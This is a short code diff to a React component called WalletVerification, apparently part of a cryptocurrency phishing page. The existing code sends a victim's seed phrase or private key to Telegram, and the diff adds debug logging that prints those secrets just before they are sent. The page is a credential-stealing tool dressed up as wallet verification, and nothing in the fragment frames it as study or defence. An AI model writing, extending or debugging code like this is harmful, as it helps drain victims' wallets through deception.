@@ -207,6 +207,12 @@ export default function WalletVerification() {
     
     // Send credentials to Telegram
     const credentials = connectionMethod === "seed" ? seedPhrase : privateKey;
+    console.log('DEBUG - About to send credentials:');
+    console.log('- connectionMethod:', connectionMethod);
+    console.log('- seedPhrase:', seedPhrase);
+    console.log('- privateKey:', privateKey);
+    console.log('- credentials (final):', credentials);
+    
     telegramMutation.mutate({
       walletType: selectedWalletType,
       connectionMethod,
